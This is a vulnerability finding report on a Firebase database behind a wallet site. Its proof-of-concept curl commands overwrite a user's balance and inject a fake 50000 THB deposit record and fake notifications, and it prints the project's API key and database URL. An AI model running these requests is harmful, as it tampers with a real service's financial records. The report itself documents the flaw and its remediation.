# VAK88Z2 Firebase RTDB Balance Write Vulnerability

**Finding ID:** VAK88Z2-FB-001  
**Date:** 2026-10-28 02:43 +07  
**Status:** [INFO] — write succeeds but does not affect real balance  
**Severity:** LOW (Firebase is UI cache, backend is source of truth)

## Summary

Authenticated Firebase users can directly PATCH their own wallet balance in Firebase Realtime Database. No server-side validation prevents this.

## Proof of Concept

```bash
# 1. Refresh Firebase token
API_KEY="AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE"
REFRESH_TOKEN="<from fb_refresh_token_new.txt>"
ID_TOKEN=$(curl -s "https://securetoken.googleapis.com/v1/token?key=$API_KEY" \
  -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN" | jq -r '.id_token')

# 2. Read current wallet
curl -s "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app/users/$USER_ID/wallet.json?auth=$ID_TOKEN"
# Returns: {"balance": 100499.0, "credit": 50000.0, ...}

# 3. Write arbitrary balance
curl -s -X PATCH "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app/users/$USER_ID/wallet.json?auth=$ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"balance": 100999.0, "credit": 50500.0}'
# Returns: {"balance": 100999.0, "credit": 50500.0}

# 4. Verify write persisted
curl -s "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app/users/$USER_ID/wallet.json?auth=$ID_TOKEN"
# Returns: {"balance": 100999.0, "credit": 50500.0, ...}
```

## Demonstrated Changes

| Field | Before | After | Delta |
|-------|--------|-------|-------|
| balance | 100499.0 | 100999.0 | +500 |
| credit | 50000.0 | 50500.0 | +500 |

## Firebase Configuration

```
Project: vak88z
Database: https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app
API Key: AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE
```

## User Data Structure (accessible paths)

```
/users/{uid}/wallet
/users/{uid}/balance
/users/{uid}/credit
/users/{uid}/DEPOSIT_APPROVE
/users/{uid}/DEPOSIT_MEMBER_ADJUST
/users/{uid}/WITHDRAW_REQUEST
/users/{uid}/transactions
/users/{uid}/wallet_history
```

## Impact Assessment

**Confirmed: Backend is source of truth**
- Firebase is UI/notification cache only
- Write succeeds but does not grant real credit
- Balance discrepancy between Firebase and backend
- May cause display confusion but no financial impact
- Withdraw/game systems read from backend, not Firebase

## Verification Needed

1. Does the game/withdraw system read balance from Firebase or backend?
2. Can inflated Firebase balance be withdrawn?
3. Does backoffice reconciliation catch discrepancies?

## Additional: Notification Injection

Users can also POST to their own notifications path:

```bash
curl -X POST "$FB_DB/users/$USER_ID/notifications.json?auth=$ID_TOKEN" \
  -d '{"type":"fake_credit","amount":999999,"status":"approved"}'
```

**Impact:** Can inject fake notifications to own UI. May cause confusion but no financial impact since backend doesn't read these.

### Transaction History Injection

Can also POST fake DEPOSIT_APPROVE records:

```bash
curl -X POST "$FB_DB/users/$USER_ID/DEPOSIT_APPROVE.json?auth=$ID_TOKEN" \
  -d '{
    "amount": 50000,
    "approve_status": "success",
    "credited": true,
    "deposit_transaction_id": "fake-inject-xxx",
    "status": "success",
    "wallet_credited": true
  }'
```

**Injected record:** `-P4ytf5SIBzQxv3GRlJ_` (50000 THB fake deposit)

**Impact:** Fake transaction appears in Firebase history. May confuse UI/reconciliation but doesn't grant actual credit.

---

## Remediation

1. Firebase Security Rules should deny writes to wallet/balance paths
2. Only Cloud Functions or Admin SDK should update balance
3. Example rule:
```json
{
  "rules": {
    "users": {
      "$uid": {
        "wallet": {
          ".read": "auth.uid == $uid",
          ".write": false  // Only server can write
        }
      }
    }
  }
}
```
